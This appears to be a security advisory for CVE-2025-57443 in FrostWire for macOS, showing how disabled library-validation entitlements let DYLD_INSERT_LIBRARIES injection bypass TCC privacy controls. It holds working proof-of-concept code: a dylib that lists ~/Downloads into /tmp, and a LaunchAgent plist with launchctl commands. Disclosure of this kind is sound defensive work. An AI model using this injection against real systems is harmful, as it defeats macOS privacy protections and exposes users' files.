# CVE-2025-57443

[FrostWire](https://github.com/frostwire/frostwire) 6.14.0-build-326

## Summary
The FrostWire macOS application includes a set of entitlements that disable standard macOS code signing and library protections. These entitlements allow unprivileged users to inject arbitrary code into the app at launch time using the `DYLD_INSERT_LIBRARIES` environment variable. 

Because FrostWire requests privacy-sensitive permissions such as `~/Documents` or `~/Downloads` folder access, an attacker can execute code in FrostWire’s TCC-approved context, leading to a stealthy privacy bypass.

## Technical Details

With the following `codesign` command we can list all the entitlements of the app.
 
```xml
swayzgl1tzyyy@SwayZGl1tZyyys-Mac ~ % codesign -dv --entitlement :- /Applications/FrostWire.app

Executable=/Applications/FrostWire.app/Contents/MacOS/FrostWire
Identifier=com.frostwire.FrostWire
Format=app bundle with Mach-O thin (x86_64)
CodeDirectory v=20500 size=931 flags=0x10000(runtime) hashes=18+7 location=embedded
Signature size=8978
Timestamp=13 May 2025 at 17:45:51
Info.plist entries=24
TeamIdentifier=KET68JTS3L
Runtime Version=11.3.0
Sealed Resources version=2 rules=13 files=180
Internal requirements count=1 size=184
Warning: Specifying ':' in the path is deprecated and will not work in a future release

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>com.apple.security.cs.allow-dyld-environment-variables</key><true/><key>com.apple.security.cs.allow-jit</key><true/><key>com.apple.security.cs.allow-unsigned-executable-memory</key><true/><key>com.apple.security.cs.disable-executable-page-protection</key><true/><key>com.apple.security.cs.disable-library-validation</key><true/></dict></plist>
```

The concerning entitlements include:

- `com.apple.security.cs.allow-dyld-environment-variables`
- `com.apple.security.cs.disable-library-validation`

These entitlements allow unprivileged users to inject arbitrary dynamic libraries into the app at launch time using the `DYLD_INSERT_LIBRARIES` environment variable.


## Impact

A TCC bypass is particularly useful in post-exploitation scenarios where an attacker already has code execution on the system but is limited by macOS privacy restrictions. For example, even if an attacker has root access, macOS still enforces TCC rules unless explicitly overridden. A successful bypass allows the attacker to:

- Code execution in the app’s security context
- Access to TCC-protected resources (e.g. `personal folders` (`~/Downloads`, `~/Documents` etc.)

This kind of bypass is often used in advanced threat scenarios or red team operations, where stealth and full access are critical. It allows attackers to escalate from a restricted execution context to full surveillance capabilities, often as part of persistence or lateral movement strategies.


### Proof-of-Concept

>This Proof of Concept demonstrates a DYLD-based code injection vulnerability in the FrostWire macOS desktop application.

Create a `dyld-exp.c` file we'll compile this to a `.dyld` file. 

```c
swayzgl1tzyyy@SwayZGl1tZyyys-Mac /tmp % cat dyld-exp.c 

#include <stdio.h>
#include <stdlib.h>
  
__attribute__((constructor))
void injected() {
    system("osascript -e 'display dialog \"✅ DYLD Injection @SwayZGl1tZyyy, Sunday 13 July 2025 \
Succeeded!\"'");
}
```

Compile it into a dynamic library (`exploit.dyld` file):
```sh
clang -dynamiclib -o exploit.dylib dyld-exp.c
```

Launch FrostWire with the injected library:
```sh
DYLD_INSERT_LIBRARIES=./exploit.dylib /Applications/FrostWire.app/Contents/MacOS/FrostWire
```

Before FrostWire launches, a dialog will pop up indicating the injected code was successfully executed. This demonstrates that:

- Code execution occurs before app startup
- The injected code runs without user consent
- The injection can inherit TCC permissions from the app

<img width="2998" height="2058" alt="fpoc" src="https://github.com/user-attachments/assets/c5d8798f-26c2-4f8c-9f80-69dd9cb5b813" />
Figure 1: Proof of Concept is successfully executed

This confirms a code-signing and TCC bypass vulnerability enabled by insecure entitlements.

## Reproducing the TCC Bypass via Dylib Injection

>Note: when attempting to reproduce the vulnerability, make sure that Terminal does not have Full Disk Access in macOS settings. This ensures that access to TCC-protected folders like Documents or Downloads is correctly restricted, and helps demonstrate the actual bypass

Create a custom dylib called bypass_downloads.dylib, first create a bypass_downloads.c file with the following code:

```swift
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
static void injected() {
    FILE *fp;
    FILE *outputFile;
    char path[1024];

    // start logging for debug
    system("echo '[+] dylib started for Downloads' > /tmp/bypass_downloads.log");

    outputFile = fopen("/tmp/Downloads.txt", "w");
    if (outputFile == NULL) {
        system("echo '[!] Couldn't open /tmp/Downloads.txt' >> /tmp/bypass_downloads.log");
        return;
    }

    // try listing the content of Downloads
    fp = popen("ls -Ol ~/Downloads 2>&1", "r");
    if (fp == NULL) {
        fprintf(outputFile, "ERROR: popen failed\n");
        fclose(outputFile);
        return;
    }

    // Output wegschrijven
    while (fgets(path, sizeof(path), fp) != NULL) {
        fprintf(outputFile, "%s", path);
    }

    pclose(fp);
    fclose(outputFile);
}
```

This library attempts to read the contents of the `~/Downloads` folder and writes them to `/tmp`.

Compile it into a `.dylib` file with the following command:
```c
clang -dynamiclib -o bypass_downloads.dylib bypass_downloads.c
```

Create a plist file named `com.bypass.downloads.plist` under `~/Library/LaunchAgent/`. This file specifies the `DYLD_INSERT_LIBRARIES` environment variable, the program and its arguments, and the output file location.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.bypass.downloads</string>

    <key>ProgramArguments</key>
    <array>
        <string>/Applications/FrostWire.app/Contents/MacOS/FrostWire</string>
    </array>

    <key>EnvironmentVariables</key>
    <dict>
        <key>DYLD_INSERT_LIBRARIES</key>
        <string>/Users/swayzgl1tzyyy/Desktop/Proof-of-Concepts/frostwire/bypass_downloads.dylib</string>
    </dict>

    <key>RunAtLoad</key>
    <true/>

    <key>KeepAlive</key>
    <false/>
</dict>
</plist>
```

Then, use the launchctl utility to execute `~/Library/LaunchAgents/com.bypass.downloads.plist` which runs FrostWire as a daemon to avoid inheriting the parent process's sandbox profile.

```sh
launchctl unload ~/Library/LaunchAgents/com.bypass.downloads.plist 2>/dev/null
launchctl load ~/Library/LaunchAgents/com.bypass.downloads.plist
```

Check the `/tmp/Downloads.txt` and verify it worked.

```sh
cat /tmp/bypass_downloads.log
cat /tmp/Downloads.txt
```

<img width="2864" height="1854" alt="pocss" src="https://github.com/user-attachments/assets/5bd04389-4b0c-4f3d-98b9-60cd42506c4a" />
Figure 2: dylib injection is succesfull

#### Suggested Fix

Remove or restrict the following entitlements:
- `com.apple.security.cs.allow-dyld-environment-variables`
- `com.apple.security.cs.disable-library-validation`


